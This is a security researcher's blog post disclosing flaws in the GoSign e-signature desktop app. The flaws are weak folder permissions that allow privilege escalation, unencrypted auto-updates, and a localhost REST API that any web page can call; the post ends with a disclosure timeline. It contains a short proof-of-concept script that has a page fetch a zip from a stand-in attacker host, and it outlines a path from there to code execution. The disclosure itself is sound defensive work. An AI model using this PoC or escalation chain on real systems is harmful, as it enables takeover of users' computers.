---
layout:     post
title:      "Registrų centras GoSign app vulnerabilities"
date:       2020-12-30 08:00:00
categories: HackAndTell
cover:      gosign_js.png
permalink:  /en/blog/registru-centras-gosign-vulnerabilities
---
After reading [an article](https://sec-consult.com/blog/detail/deanonymization-of-lithuanian-e-signature-users/) about a remediated information disclosure vulnerability in [GoSign](https://www.elektroninis.lt/paruosti-kompiuteri/nid-1287) - an e-signature desktop application by the State Enterprise Centre of Registers of Lithuania (Registrų centras), I became curious if it is not vulnerable to the other attack - DNS rebinding. In this blog post I'll review what I've found and what was fixed.

[GoSign](https://www.elektroninis.lt/bylos/elektroninis_lt/Diegliai/GoSignCore.msi) installs two Windows services: GoSign and GoSignMonitor (installed by default) and GoSignUI tray application (optional feature, not installed by default). Both services start on bootup and run with highest privileges possible - LocalSystem. It doesn't matter if the user has the identity card inserted or not.

![Services](gosign_sc.png)

However, the GoSign installer erroneously grants all local users full permissions to `c:\Program Files (x86)\RCSC\GoSign` folder:

![Gosign folder permissions](gosign_acl.png)

This allows regular users to modify the `GoSign.exe` and `GoSignMonitor.exe` (or any dll they load). Since the executables files run as LocalSystem it allows for Local Elevation of Privileges (EoP). Even so, the issue may be dismissed by private users, in government institutions, where computers are usually managed by technicians and regular users have restricted permissions, this is a valuable vulnerability for EoP by malicious programs.

Instead of fixing the installer to set the correct permissions to the root folder it was attempted to fix the issue in the version 3.3.4.0 by making GoSign service to verify and fix the permissions at runtime:

![Gosign runtime ACL fix](gosign_acl_fix.png)

Firstly, it doesn't work at all, because GoSign attempts to remove an inherited permission. Also it says a lot about internal development and testing processes. Secondly, attempting to make such privileged operations at runtime doesn't make it easier to change the existing GoSign architecture to stop running its services as LocalSystem. All in all, the EoP is still not fixed.

GoSignMonitor is a helper service that calls [http://downloads.registrucentras.lt/bylos/dokumentai/rcsc/gosigncore/Version.txt](http://downloads.registrucentras.lt/bylos/dokumentai/rcsc/gosigncore/Version.txt) and if a new version is available the service downloads [http://downloads.registrucentras.lt/bylos/dokumentai/rcsc/gosigncore/GoSignCore.zip](http://downloads.registrucentras.lt/bylos/dokumentai/rcsc/gosigncore/GoSignCore.zip) and extracts the zip into the installation directory. Yes, over unencrypted connection as LocalSystem. And it does it every 10 minutes. While less likely in case of an office user, in a private user case it opens the computer to a Remote Code Execution (RCE) for an attacker capable of intercepting the unencrypted traffic like in public WIFI network. The GoSign service is stopped before the zip extraction and restarted afterwards. Since the attacker-controlled executable is started as LocalSystem it means a complete computer takeover.

It was attempted to address the issue. The newer version of GoSignMonitor checks for updates and downloads them over HTTPS. Still, because of a mistake the automatic update process extracts the new version of the executable into the wrong folder: `C:\Program Files (x86)\RCSC\GoSign\GoSignMonitor\GoSignMonitor\GoSignMonitor.exe`. This way the existing users of GoSign are left vulnerable and need to manually uninstall the old version and install the version 3.3.4.0 themselves.

Overall, the automatic update architecture of GoSign is overengineered and convoluted. Each service kills and updates the other one. Instead of downloading and starting the new version of GoSign installer they download specific zip files that contain a selected set of executable files (i.e. without all .NET Core framework dlls they depend on) and overwrite the old files with the extracted ones. The failure to use the standard installer for this task leads to creation of GoSignUI folder with some files in it even if the feature wasn't installed to begin with. Also the fact the update is done silently without an acknowledgment means that by breaking into `downloads.registrucentras.lt` ten minutes later attackers could effectively compromise all computers with GoSign installed.

GoSign is the other installed service that runs a local web server on TCP ports 8000 and 60000. The server exposes the following REST API:

```
GET  /nexu-info
POST /rest/certificates
GET  /rest/certificates
POST /rest/sign
POST /rest/loadApp
GET  /diagnostics
POST /certs
GET  /certs
POST /multisign
POST /ping
GET  /rest/ping
```

Before version 3.2.2.0 a malicious JavaScript on any web page could call the local server and read its response. In v3.2.2.0 to mitigate the issue the following Cross-Origin Resource Sharing (CORS) list is hardcoded into the service:

```
https://ws.gosign.lt
https://wstest.gosign.lt
https://www.elektroninis.lt
https://test.elektroninis.lt
https://dev.elektroninis.lt
https://mati.registrucentras.lt
https://apptest4.kada.lt
https://appdevel4.kada.lan
```

The common misconception about CORS is that it allows requests to the server only from the selected list. What it really does, it instructs the browser to allow a web page from a selected origin to _**read**_ the server response. Any web page is still able to issue a [simple request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests) to the web server. The CORS list fixed the issue where malicious pages could read personal information from the inserted identity card. Still, in v3.2.2.0 it was possible to blindly call any of the API.

The `/rest/loadApp` API commands GoSignUI to automatically download a file from the specified `url`, extract it if it is an archive and open in AutoDesk TrueView 2018 or AutoDesk DesignReview 2018 viewer. Proof of Concept:

```html
<script>
  fetch("https://localhost:8000/rest/loadApp", {
    method: 'POST',
    body: 'url=https://evil.com/evil.zip'
  })
</script>
```

An attacker could:

* Force GoSign users to download a [Zip Bomb](https://en.wikipedia.org/wiki/Zip_bomb).  
* Achieve RCE by using a specially crafted DWG or DWF file. It is as simple to exploit one of the [known vulnerabilities in AutoDesk DesignReview 2018](https://www.cvedetails.com/vulnerability-list/vendor_id-3855/product_id-15106/year-2019/opec-1/Autodesk-Design-Review.html) as zipping malicious DWF and DLL files into the same archive. Since GoSignUI runs as non-privileged process that should reduce the RCE impact. Nevertheless, because of the improper installation folder permissions it is easy to escalate to LocalSystem.  

My recommendation was to implement a `Origin` header check on the server side, but in the version 3.3.4.0 `/rest/loadApp` verifies `Referer` header instead. This is not ideal since the header may be not present, but it should be OK as long as the server rejects requests without `Referer`. Both `Referer` and `Origin` are [forbidden headers](https://developer.cdn.mozilla.net/en-US/docs/Glossary/Forbidden_header_name), i.e. are guaranteed to be not spoofable by malicious sites. However, the check wasn't implemented as .NET Core Middleware, so it is still possible for any web site to call the other API endpoints.

### Timeline

2020.09.25-29 - Contacted [info@gosign.lt](mailto:info@gosign.lt), [info@elektroninis.lt](mailto:info@elektroninis.lt), [info@registrucentras.lt](mailto:info@registrucentras.lt) asking for the security contract.  
2020.10.01 - A report was sent to [pagalba@elektroninis.lt](mailto:pagalba@elektroninis.lt).  
2020.10.01 - The report was acknowledged.  
2020.12.21 - Received an email that v3.3.4.0 with the fixes was released.  
2020.12.28 - Vendor was notified about the not fixed issues.  
2020.12.30 - Disclosure deadline reached.  
